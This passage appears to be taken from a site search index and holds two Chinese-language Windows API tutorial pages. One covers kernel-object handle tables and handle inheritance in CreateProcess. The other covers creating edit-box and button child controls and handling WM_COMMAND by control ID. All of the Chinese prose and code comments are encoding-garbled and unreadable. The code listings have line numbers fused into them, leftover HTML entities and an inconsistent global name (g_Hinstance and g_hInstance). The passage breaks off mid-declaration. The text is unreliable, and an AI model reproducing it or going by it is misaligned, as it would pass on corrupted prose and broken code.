handleï¼‰ã€‚æ¯”å¦‚çˆ¶è¿›ç¨‹å¥æŸ„è¡¨å¦‚ä¸‹ï¼š æ ‡è¯†è¯¥å¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿ï¼ˆ0è¡¨ç¤ºä¸å¯ä»¥ï¼Œ1è¡¨ç¤ºå¯ä»¥ï¼‰ ç´¢å¼•å· è¡¨ç¤ºçš„å†…æ ¸å¯¹è±¡ 0 1 A 1 2 B 0 3 C 1 4 D å­è¿›ç¨‹ç»§æ‰¿åçš„å¥æŸ„è¡¨å¦‚ä¸‹ï¼ˆå¯ç»§æ‰¿çš„å°±ç»§æ‰¿è¿‡æ¥ï¼Œä¸å¯ç»§æ‰¿çš„é‚£è¡Œå…¨éƒ¨å¡«0ï¼‰ï¼š æ ‡è¯†è¯¥å¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿ï¼ˆ0è¡¨ç¤ºä¸å¯ä»¥ï¼Œ1è¡¨ç¤ºå¯ä»¥ï¼‰ ç´¢å¼•å· è¡¨ç¤ºçš„å†…æ ¸å¯¹è±¡ 0 0 0 1 2 B 0 0 0 1 4 0 å¦‚æ­¤ä¸€æ¥ï¼Œå­è¿›ç¨‹ä¾¿å¯é€šè¿‡ç»§æ‰¿æ¥çš„è¿™äº›å¥æŸ„å€¼ä¸çˆ¶è¿›ç¨‹å…±äº«å†…æ ¸å¯¹è±¡äº†ã€‚ ä¸²è®² æ–‡ç« å‰é¢æ˜¯æ ¹æ®å­¦ä¹ é¡ºåºå†™çš„ï¼Œæœ‰æ¨å¯¼è¿‡ç¨‹ï¼Œè¿™ä¸ªæ ‡é¢˜å°†å‰é¢çš„å†…å®¹åšä¸€ä¸ªä¸²è®² windowsé‡‡ç”¨å¥æŸ„è¡¨çš„æ–¹å¼è®©åº”ç”¨å±‚ä½¿ç”¨å†…æ ¸å¯¹è±¡ï¼ˆè¿›ç¨‹ï¼Œçº¿ç¨‹ï¼Œæ–‡ä»¶ï¼ŒEventï¼Œäº’æ–¥ä½“ç­‰ï¼‰ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç§æœ‰çš„ä¸€ä¸ªå¥æŸ„è¡¨ï¼Œå¥æŸ„è¡¨åœ¨è¿›ç¨‹çš„EPROCESSç»“æ„ä½“ä¸­ï¼Œæœ‰ä¸‰åˆ—ï¼š æ ‡è¯†è¯¥å¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿ ç´¢å¼•å· å†…æ ¸å¯¹è±¡åœ°å€ åº”ç”¨å±‚é€šè¿‡Handleï¼ˆå¥æŸ„è¡¨ä¸­çš„ç´¢å¼•å·ï¼‰æ¥ä½¿ç”¨å†…æ ¸å¯¹è±¡ã€‚ æ¯ä¸ªå†…æ ¸å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œå®ƒè¡¨ç¤ºæœ‰å¤šå°‘å¥æŸ„æŒ‡å‘è¯¥å†…æ ¸å¯¹è±¡ã€‚å¦‚æœæœ‰è¿›ç¨‹æ‰“å¼€ï¼ˆæˆ–å¤åˆ¶ï¼‰ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå†…æ ¸å¯¹è±¡çš„å¥æŸ„æ—¶ï¼Œå¼•ç”¨è®¡æ•°å™¨å°±åŠ 1ï¼›è¿›ç¨‹ä½¿ç”¨CloseHandleå…³é—­æŒ‡å‘è¯¥å†…æ ¸å¯¹è±¡çš„å¥æŸ„ï¼Œå¼•ç”¨è®¡æ•°å™¨ä¾¿å‡1ã€‚å½“å¼•ç”¨è®¡æ•°å™¨å‡è‡³0æ—¶ï¼Œå³æ²¡æœ‰ä»»ä½•è¿›ç¨‹æŒæœ‰æŒ‡å‘è¯¥å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ—¶ï¼Œå†…æ ¸å¯¹è±¡æ‰ä¼šè¢«é”€æ¯ã€‚ çº¿ç¨‹å†…æ ¸å¯¹è±¡å’Œè¿›ç¨‹å†…æ ¸å¯¹è±¡é™¤å¤–ï¼Œå³ä½¿çº¿ç¨‹çš„å†…æ ¸å¯¹è±¡è®¡æ•°å™¨ä¸º0ï¼Œçº¿ç¨‹ä»ä¼šç»§ç»­æ‰§è¡Œï¼›è€Œçº¿ç¨‹æ²¡æ­»ï¼Œè¿›ç¨‹ä¹Ÿä¸ä¼šæ­»ã€‚ çº¿ç¨‹å†…æ ¸å¯¹è±¡é‡Šæ”¾éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š å…³é—­çº¿ç¨‹ çº¿ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨ä¸º0 è¿›ç¨‹å†…æ ¸å¯¹è±¡ä¹Ÿä¸€æ ·ï¼šå…³é—­è¿›ç¨‹ï¼Œè¿›ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨ä¸º0ã€‚ å¦‚æœä¸€ä¸ªè¿›ç¨‹é‡Œä¸€ä¸ªæ´»åŠ¨çº¿ç¨‹éƒ½æ²¡æœ‰äº†ï¼Œè¿›ç¨‹ä¹Ÿå°±ç»“æŸäº†ã€‚ åˆ¤æ–­å“ªäº›æ˜¯å†…æ ¸å¯¹è±¡çš„ä¸¤ç§æ–¹æ³•ï¼š åœ¨MSDNCloseHandleå‡½æ•°é¡µé¢æœ‰æŒ‡å‡ºå“ªäº›æ˜¯å†…æ ¸å¯¹è±¡ Createxxxå‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸­å¦‚æœæœ‰LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ï¼Œåˆ™è¿™ä¸ªobjectæ˜¯å†…æ ¸å¯¹è±¡ã€‚ LPSECURITY_ATTRIBUTESæ˜¯ä¸€ä¸ªæŒ‡å‘SECURITY_ATTRIBUTESç»“æ„ä½“çš„æŒ‡é’ˆï¼ŒSECURITY_ATTRIBUTESç»“æ„ä½“ä¸­æœ‰ä¸ªæˆå‘˜å«bInheritHandleã€‚ å½“bInheritHandleä¸ºTRUEæ—¶ï¼Œè¡¨ç¤ºå¥æŸ„å¯ä»¥è¢«ç»§æ‰¿ å½“bInheritHandleä¸ºFALSEæ—¶ï¼Œè¡¨ç¤ºå¥æŸ„ä¸å¯ä»¥è¢«ç»§æ‰¿ å› ä¸º0ç¯ç©ºé—´æ˜¯æ‰€æœ‰è¿›ç¨‹å…±äº«çš„ï¼Œæ‰€ä»¥å†…æ ¸å¯¹è±¡æ˜¯å¯ä»¥åœ¨ä¸åŒè¿›ç¨‹ä¹‹é—´å…±äº«çš„ã€‚ å…±äº«å†…æ ¸å¯¹è±¡çš„ä¸¤ç§æ–¹å¼ï¼š è·¨è¿›ç¨‹å…±äº«ã€‚è¿›ç¨‹Aåˆ›å»ºå†…æ ¸å¯¹è±¡ï¼Œè¿›ç¨‹Bæ‰“å¼€è¯¥å†…æ ¸å¯¹è±¡ å­è¿›ç¨‹ç»§æ‰¿çˆ¶è¿›ç¨‹å¥æŸ„ï¼Œè¾¾åˆ°å­çˆ¶è¿›ç¨‹å…±äº«åŒä¸€å†…æ ¸å¯¹è±¡çš„æ•ˆæœã€‚ CreateProcessç¬¬äº”ä¸ªå‚æ•°bInheritHandlesç”¨æ¥è¡¨ç¤ºåˆ›å»ºçš„è¿™ä¸ªå­è¿›ç¨‹æ˜¯å¦ç»§æ‰¿çˆ¶è¿›ç¨‹çš„å¥æŸ„è¡¨çš„å†…å®¹ã€‚ å¦‚æœç»§æ‰¿ï¼Œåªä¼šç»§æ‰¿çˆ¶è¿›ç¨‹å¯ç»§æ‰¿çš„å¥æŸ„ï¼ˆinheritable handleï¼‰ï¼Œçˆ¶è¿›ç¨‹ä¸­ä¸å¯ç»§æ‰¿çš„å¥æŸ„é‚£è¡Œå…¨éƒ¨å¡«0 è¾¨æ CreateProcessç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªå‚æ•°æ˜¯è¡¨ç¤ºè¿›ç¨‹å¥æŸ„ï¼Œçº¿ç¨‹å¥æŸ„æ˜¯å¦å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ï¼ˆâ€œåˆ›å»ºå†…æ ¸å¯¹è±¡æ—¶ï¼Œè®¾ç½®è¯¥å¥æŸ„æ˜¯å¦&quot;å¯ä»¥/å…è®¸&quot;è¢«ç»§æ‰¿â€è¿™ä¸€æ ‡é¢˜çš„å†…å®¹ï¼‰whether the handle can be inherited(å¥æŸ„èƒ½å¦è¢«ç»§æ‰¿) ç¬¬äº”ä¸ªå‚æ•°bInheritHandlesæ˜¯è¡¨ç¤ºåˆ›å»ºçš„è¿™ä¸ªè¿›ç¨‹æ˜¯å¦ç»§æ‰¿çˆ¶è¿›ç¨‹çš„å¥æŸ„è¡¨ï¼ˆâ€œçˆ¶è¿›ç¨‹å¥æŸ„æ˜¯å¦è¢«å­è¿›ç¨‹ç»§æ‰¿â€è¿™ä¸€æ ‡é¢˜çš„å†…å®¹ï¼‰inherite the inheritable handle or not(æ˜¯å¦ç»§æ‰¿å¥æŸ„) ä¸¤ä¸ªçš„æ€§è´¨ä¸ä¸€æ · 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, // åˆ›å»ºçš„è¿™ä¸ªè¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„èƒ½å¦è¢«ç»§æ‰¿ LPSECURITY_ATTRIBUTES lpThreadAttributes, // åˆ›å»ºçš„è¿™ä¸ªè¿›ç¨‹çš„çº¿ç¨‹å¥æŸ„èƒ½å¦è¢«ç»§æ‰¿ BOOL bInheritHandles, // æ˜¯å¦ç»§æ‰¿çˆ¶è¿›ç¨‹å¥æŸ„è¡¨çš„å†…å®¹ DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);"},{"title":"å­çª—å£","path":"/wiki/Windows_API/å­çª—å£.html","content":"å‰è¨€ ç¬¬ä¸€ä¸ªçª—å£ç¨‹åºé‚£ä¸€å°èŠ‚æˆ‘ä»¬é€šè¿‡åˆ›å»ºWNDCLASSç±»çš„å¯¹è±¡ï¼Œå¡«å……å­—æ®µï¼Œæ³¨å†Œçª—å£ç±»ï¼ŒCreateWindowåˆ›å»ºå‡ºçª—å£ï¼Œæœ€åShowWindowæ˜¾ç¤ºçª—å£ã€‚ 12345678910111213141516171819202122232425// 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„WNDCLASS wndClass = &#123; 0 &#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰²TCHAR className[] = TEXT(&quot;My First Window&quot;);wndClass.lpszClassName = className; // çª—å£ç±»åwndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstancewndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•°// 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±»HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º//...//æ£€æŸ¥CreateWindowæ˜¯å¦æ‰§è¡ŒæˆåŠŸçš„ä»£ç ç•¥//...ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ åˆ›å»ºä¸€ä¸ªçª—å£çš„æµç¨‹å°±æ˜¯å¦‚ä¸Šé¢è¿™æ ·ã€‚å¦‚æœæƒ³è‡ªå·±ç”»ä¸€ä¸ªçª—å£ï¼Œæ­¥éª¤å°±æ˜¯ä¸Šé¢è¿™ä¸€å¥—ã€‚ä½†å¯¹äºå¸¸ç”¨çš„ä¸€äº›çª—å£ï¼ŒWindowså·²ç»é¢„å…ˆå®šä¹‰å¥½äº†è¿™äº›çª—å£çš„ç±»ï¼ˆæ¯”å¦‚æŒ‰é’®ï¼Œå¤é€‰æ¡†ï¼Œç¼–è¾‘æ¡†ï¼Œé™æ€å­—ç¬¦ä¸²æ ‡ç­¾å’Œæ»šåŠ¨æ¡ç­‰ï¼‰æ–¹ä¾¿å¼€å‘è€…ä½¿ç”¨ï¼Œä¸€èˆ¬ç§°å®ƒä»¬ä¸ºå­çª—å£æ§ä»¶ï¼Œç®€ç§°æ§ä»¶ã€‚æ§ä»¶ä¼šè‡ªå·±å¤„ç†æ¶ˆæ¯ï¼Œåœ¨è‡ªå·±çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶é€šçŸ¥çˆ¶çª—å£ï¼Œæ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨è¿™äº›é¢„å®šä¹‰å¥½çš„å­çª—å£ï¼Œä¸éœ€è¦ç»™å®ƒä»¬å®šä¹‰å›è°ƒå‡½æ•°ï¼Œè€Œåœ¨çˆ¶çª—å£çš„å›è°ƒå‡½æ•°ä¸­å°±èƒ½å¤„ç†åˆ°è¿™äº›å­çª—å£çš„æ¶ˆæ¯ã€‚ ä¸‹ä¸€å°èŠ‚ä¼šè¯¦ç»†å±•å¼€è®²ä¸‹ï¼Œå­çª—å£æ¶ˆæ¯å¦‚ä½•åˆ°çˆ¶çª—å£å›è°ƒå‡½æ•°çš„ï¼Œè¿™é‡Œå…ˆç²—ç•¥ç†è§£ä¸ºè¿™æ ·ã€‚ æœ¬å°èŠ‚å°±æ˜¯æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨å­çª—å£æ§ä»¶ï¼Œå¦‚ä½•å¤„ç†å­çª—å£çš„æ¶ˆæ¯ï¼Œé‡ç‚¹åœ¨äºé‡åˆ°é—®é¢˜æ—¶å¦‚ä½•æ€è€ƒå¦‚ä½•æŸ¥æ–‡æ¡£ï¼Œä»¥åŠåœ¨å®éªŒè¿‡ç¨‹ä¸­ä½“ä¼šwindowsçª—å£çš„æ¶ˆæ¯æœºåˆ¶ã€‚å¦å¤–ï¼Œç”±äºå­çª—å£æ§ä»¶ä¸ç¾è§‚ï¼Œåœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­å¹¶ä¸ä½¿ç”¨ï¼Œåç»­éœ€è¦å­¦ä¹ MFCï¼ŒMFCçš„çª—å£æ›´ç¾è§‚ä¸”å¼€å‘æ›´é«˜æ•ˆã€‚ åˆ›å»ºå­çª—å£ åœ¨å“ªé‡Œæ·»åŠ åˆ›å»ºå­çª—å£çš„ä»£ç å‘¢ï¼Ÿæœ‰ä¸€ç§æ–¹æ³•æ˜¯åœ¨CreateWindowä¸»çª—å£ä»£ç åè¾¹å†ä½¿ç”¨CreateWindowåˆ›å»ºå­çª—å£ï¼Œåç»­æ­¥éª¤å’Œä¸»çª—å£ä¸€æ ·ã€‚ä½†å®é™…ä¸Šè¿˜æœ‰ä¸€ç§åŠæ³•ï¼Œå°±æ˜¯åœ¨ä¸»çª—å£çª—å£è¿‡ç¨‹å‡½æ•°çš„WM_CREATEæ¶ˆæ¯ä¸­ä½¿ç”¨CreateWindowåˆ›å»ºå­çª—å£ã€‚çˆ¶çª—å£ä¸€åˆ›å»ºï¼Œäº§ç”ŸWM_CREATEæ¶ˆæ¯ï¼Œå°±ä¼šåˆ›å»ºå­çª—å£ã€‚ ä¸‹ä¸€å°èŠ‚æ¼”ç¤ºåœ¨CreateWindowä¸»çª—å£ä»£ç åè¾¹ä½¿ç”¨CreateWindowåˆ›å»ºå­çª—å£ åˆ›å»ºç¼–è¾‘æ¡†12345678910111213141516171819// å½“çª—å£åˆ›å»ºæ—¶ï¼Œåˆ›å»ºå­çª—å£æ§ä»¶case WM_CREATE:&#123; // åˆ›å»ºç¼–è¾‘æ¡† CreateWindow( TEXT(&quot;EDIT&quot;), // lpClassName: çª—å£ç±»åï¼Œè¿™é‡Œæ˜¯é¢„å®šä¹‰çš„ç¼–è¾‘æ¡†ç±» TEXT(&quot;&quot;), // lpWindowName: çª—å£æ ‡é¢˜ï¼Œè¿™é‡Œä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå› ä¸ºç¼–è¾‘æ¡†é€šå¸¸ä¸éœ€è¦æ ‡é¢˜ WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, // dwStyle: çª—å£æ ·å¼ï¼Œè¿™é‡ŒåŒ…æ‹¬å­çª—å£ã€å¯è§ã€å‚ç›´æ»šåŠ¨æ¡å’Œå¤šè¡Œç¼–è¾‘æ¡† 0, // x: çª—å£çš„æ°´å¹³ä½ç½®ï¼Œç›¸å¯¹äºçˆ¶çª—å£ 0, // y: çª—å£çš„å‚ç›´ä½ç½®ï¼Œç›¸å¯¹äºçˆ¶çª—å£ 400, // nWidth: çª—å£çš„å®½åº¦ 300, // nHeight: çª—å£çš„é«˜åº¦ hwnd, // hWndParent: çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ˜¯WM_CREATEæ¶ˆæ¯ä¸­æ¥æ”¶åˆ°çš„çª—å£å¥æŸ„ NULL, // hMenu: èœå•å¥æŸ„æˆ–å­çª—å£IDï¼Œè¿™é‡Œå…ˆä¸ºNULLï¼Œåé¢ä¼šæ g_Hinstance, // hInstance: çª—å£å®ä¾‹å¥æŸ„ NULL // lpParam: æŒ‡å‘åˆ›å»ºçª—å£æ—¶ä¼ é€’çš„å€¼çš„æŒ‡é’ˆï¼Œè¿™é‡Œä¸ºNULL ); break;&#125; dwStyleå‚æ•°å¡«è¿™ä¸ªçª—å£çš„é£æ ¼ï¼ŒåŒ…æ‹¬çª—å£é€šç”¨é£æ ¼å’Œç‰¹æœ‰é£æ ¼ çª—å£é€šç”¨é£æ ¼ï¼šCreateWindowçš„MSDNä¸Šæ˜¯ä¸€äº›é€šç”¨çª—å£çš„é£æ ¼Window Styles å­çª—å£å¿…å¡«WS_CHILDï¼ˆè¡¨ç¤ºæ˜¯å­çª—å£ï¼‰ï¼ŒWS_VISIBLEï¼ˆè¡¨ç¤ºå¯è§ï¼‰ ç‰¹æœ‰é£æ ¼ æ¯”å¦‚MSDNä¸ŠæœEdit StyleæŸ¥EDITç¼–è¾‘æ¡†ç‰¹æœ‰çš„é£æ ¼ã€‚ES_MULTILINEè¡¨è¿™ä¸ªæ–‡æœ¬æ¡†å¯å¤šè¡Œç¼–è¾‘ hInstanceå¡«å¥æŸ„ï¼Œè¡¨ç¤ºè¯¥çª—å£æ‰€å±è¿›ç¨‹ã€‚ å­çª—å£æ‰€å±æ˜¯å½“å‰ç¨‹åºï¼Œå¡«WinMainå‚æ•°hInstanceï¼Œä½†hInstanceåªåœ¨WinMainå‡½æ•°ä¸­å¯è§ï¼Œåœ¨WindowProcå‡½æ•°ä¸­ä¸å¯è§ï¼Œæ‰€ä»¥å‰é¢è¦ç”¨ä¸ªå…¨å±€å˜é‡æ¥å­˜ä¸‹WinMainå‚æ•°hInstanceã€‚ 1234567891011HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123; g_hInstance = hInstance; //å…¶ä½™ä»£ç ç•¥&#125; åˆ›å»ºæŒ‰é’®1234567891011121314151617181920212223242526272829// åˆ›å»º&quot;è®¾ç½®&quot;æŒ‰é’®CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: çª—å£ç±»åï¼Œè¿™é‡Œæ˜¯é¢„å®šä¹‰çš„æŒ‰é’®ç±» TEXT(&quot;è®¾ç½®&quot;), // lpWindowName: æŒ‰é’®ä¸Šçš„æ–‡å­— WS_CHILD | WS_VISIBLE, // dwStyle: çª—å£æ ·å¼ï¼Œè¿™é‡ŒåŒ…æ‹¬å­çª—å£å’Œå¯è§ 450, // x: æ°´å¹³ä½ç½® 150, // y: å‚ç›´ä½ç½® 80, // nWidth: å®½åº¦ 20, // nHeight: é«˜åº¦ hwnd, // hWndParent: çˆ¶çª—å£å¥æŸ„ NULL, // hMenu: èœå•å¥æŸ„æˆ–å­çª—å£IDï¼Œè¿™é‡Œå…ˆä¸ºNULLï¼Œåé¢ä¼šæ g_Hinstance, // hInstance: å®ä¾‹å¥æŸ„ NULL // lpParam: åˆ›å»ºçª—å£æ—¶ä¼ é€’çš„å€¼ï¼Œè¿™é‡Œä¸ºNULL);// åˆ›å»º&quot;è·å–&quot;æŒ‰é’®CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: çª—å£ç±»åï¼ŒåŒæ ·æ˜¯æŒ‰é’®ç±» TEXT(&quot;è·å–&quot;), // lpWindowName: æŒ‰é’®ä¸Šçš„æ–‡å­— WS_CHILD | WS_VISIBLE, // dwStyle: çª—å£æ ·å¼ 450, // x: æ°´å¹³ä½ç½® 100, // y: å‚ç›´ä½ç½® 80, // nWidth: å®½åº¦ 20, // nHeight: é«˜åº¦ hwnd, // hWndParent: çˆ¶çª—å£å¥æŸ„ NULL, // hMenu: èœå•å¥æŸ„æˆ–å­çª—å£IDï¼Œè¿™é‡Œå…ˆä¸ºNULLï¼Œåé¢ä¼šæ g_Hinstance, // hInstance: å®ä¾‹å¥æŸ„ NULL // lpParam: åˆ›å»ºçª—å£æ—¶ä¼ é€’çš„å€¼); è¿è¡Œåçœ‹åˆ°å­çª—å£è¢«åˆ›å»ºå‡ºæ¥äº†ï¼Œç”¨æˆ·ç‚¹å‡»â€œè·å–â€æˆ–â€œè®¾ç½®â€æŒ‰é’®æ—¶å­çª—å£æ˜¯çŸ¥é“çš„ã€‚ å¤„ç†å­çª—å£æ¶ˆæ¯ å­çª—å£æ§ä»¶è‡ªå·±ä¼šå¤„ç†æ¶ˆæ¯ï¼Œå°†æ¶ˆæ¯å‘åˆ°çˆ¶çª—å£ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨çˆ¶çª—å£çš„å›è°ƒå‡½æ•°ä¸­å¤„ç†è¿™äº›å­çª—å£çš„æ¶ˆæ¯ã€‚å‡è®¾å½“â€œè·å–â€æŒ‰é’®æŒ‰ä¸‹æ—¶ï¼Œæˆ‘ä»¬è¦åšä¸€äº›äº‹ã€‚é‚£ä¹ˆï¼Œæ€ä¹ˆçŸ¥é“å½“â€œè·å–â€æŒ‰é’®æŒ‰ä¸‹æ—¶è§¦å‘çš„æ˜¯ä»€ä¹ˆæ¶ˆæ¯ï¼Ÿ å’Œä¹‹å‰ä¸€æ ·ï¼Œå°†æ¶ˆæ¯æ‰“å°å‡ºæ¥ã€‚ 123456789101112131415LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;Message: %x - %x &quot;, hwnd, uMsg); OutputDebugString(szOutBuff); switch (uMsg) &#123; //switchè¯­å¥å†…å®¹ç•¥ &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; è¿è¡Œï¼ŒæŒ‰ä¸‹â€œè·å–â€æŒ‰é’®ï¼ŒæŸ¥çœ‹æ¶ˆæ¯çš„å€¼ï¼Œå‘ç°æ˜¯111 ç„¶åéšä¾¿æ‰¾ä¸ªWM_CREATEè¿›åˆ°å®šä¹‰çš„å¤´æ–‡ä»¶ä¸­å»æœ111ï¼Œæ‰¾åˆ°111è¿™ä¸ªå€¼å¯¹åº”çš„å®ï¼Œå‘ç°æ˜¯WM_COMMANDï¼Œç„¶åå»MSDNæœWM_COMMANDçœ‹è¿™ä¸ªæ¶ˆæ¯ç›¸å…³çš„è¯´æ˜ 1#define WM_COMMAND 0x0111 é—®é¢˜æ¥äº†ï¼Œç‚¹å‡»â€œè®¾ç½®â€æŒ‰é’®å’Œâ€œè·å–â€æŒ‰é’®äº§ç”Ÿçš„æ¶ˆæ¯éƒ½æ˜¯WM_COMMANDï¼Œå¦‚ä½•åŒºåˆ«æ˜¯ç‚¹äº†â€œè®¾ç½®â€æŒ‰é’®è¿˜æ˜¯â€œè·å–â€æŒ‰é’®ï¼Ÿ èœå•ID CreateWindowé‡Œæœ‰ä¸ªhMenuå‚æ•°ï¼Œåˆ›å»ºå­çª—å£æ—¶å¯ä»¥ç»™è¿™ä¸ªçª—å£æŒ‡å®šIDã€‚äº§ç”ŸWM_COMMANDæ—¶ï¼ŒwParamå‚æ•°çš„ä½wordå­—èŠ‚è¡¨ç¤ºçš„æ˜¯èœå•IDï¼ˆMenu identifierï¼‰ã€‚ åœ¨ä»£ç å‰é¢å®šä¹‰èœå•IDï¼Œåˆ›å»ºå­çª—å£æ—¶hMenuå‚æ•°å¡«è¿™ä¸ªå‚æ•°ã€‚ 1234// å®šä¹‰å­çª—å£æ ‡è¯†#define IDC_EDIT_1 0x100#define IDC_BUTTON_1 0x101#define IDC_BUTTON_2 0x102 1234567891011121314151617181920212223242526272829303132333435363738394041424344// åˆ›å»ºç¼–è¾‘æ¡†CreateWindow( TEXT(&quot;EDIT&quot;), TEXT(&quot;&quot;), WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, 0, 0, 400, 300, hwnd, (HMENU)IDC_EDIT_1, // hMenu: å­çª—å£IDï¼Œå¼ºè½¬ä¸ºHMENUç±»å‹ g_hInstance, NULL );// åˆ›å»º&quot;è®¾ç½®&quot;æŒ‰é’®CreateWindow( TEXT(&quot;BUTTON&quot;), TEXT(&quot;è®¾ç½®&quot;), WS_CHILD | WS_VISIBLE, 450, 150, 80, 20, hwnd, (HMENU)IDC_BUTTON_1, // hMenu: å­çª—å£IDï¼Œå¼ºè½¬ä¸ºHMENUç±»å‹ g_hInstance, NULL );// åˆ›å»º&quot;è·å–&quot;æŒ‰é’®CreateWindow( TEXT(&quot;BUTTON&quot;), TEXT(&quot;è·å–&quot;), WS_CHILD | WS_VISIBLE, 450, 100, 80, 20, hwnd, (HMENU)IDC_BUTTON_2, // hMenu: å­çª—å£IDï¼Œå¼ºè½¬ä¸ºHMENUç±»å‹ g_hInstance, NULL ); WM_COMMANDæ¶ˆæ¯ä¸­ç”¨LWORDå®å–wParamå‚æ•°ä½16å­—èŠ‚ï¼Œé€šè¿‡èœå•IDæ¥åˆ¤æ–­æ˜¯å“ªä¸ªæŒ‰é’®è¢«ç‚¹å‡»ã€‚ 1234567891011121314151617181920212223242526// å½“æŒ‰é’®è¢«ç‚¹å‡»case WM_COMMAND:&#123; // æ¶ˆæ¯ä¸ºWM_COMMANDæ—¶ï¼ŒwParamå‚æ•°çš„ä½16ä½ä¸­ä¸ºèœå•ID //ä½¿ç”¨LOWORDå®è·è·å–wParamå‚æ•°ä½16ä½ switch (LOWORD(wParam)) &#123; // å½“æŒ‰é’®ä¸ºè®¾ç½® case IDC_BUTTON_1: &#123; // SetDlgItemTextå‡½æ•°ä¿®æ”¹ç¼–è¾‘æ¡†å†…å®¹ SetDlgItemText(hwnd, (int)IDC_EDIT_1, TEXT(&quot;æµ‹è¯•&quot;)); break; &#125; // å½“æŒ‰é’®ä¸ºè·å– case IDC_BUTTON_2: &#123; TCHAR szEditBuffer[0x80]; GetDlgItemText(hwnd, (int)IDC_EDIT_1, szEditBuffer, 0x80); //è·å–ç¼–è¾‘æ¡†ä¸­å†…å®¹ MessageBox(NULL, szEditBuffer, NULL, NULL); break; &#125; &#125; break;&#125; SetDlgItemTextï¼šè®¾ç½®æ–‡æœ¬æ¡†é‡Œçš„æ–‡æœ¬å†…å®¹ GetDlgItemTextï¼šè·å–æ–‡æœ¬æ¡†é‡Œçš„æ–‡æœ¬å†…å®¹åˆ°ç¼“å†²åŒºä¸­ ç¨‹åºå®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);HINSTANCE g_hInstance;// å®šä¹‰å­çª—å£æ ‡è¯†#define IDC_EDIT_1 0x100#define IDC_BUTTON_1 0x101#define IDC_BUTTON_2 0x102int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE 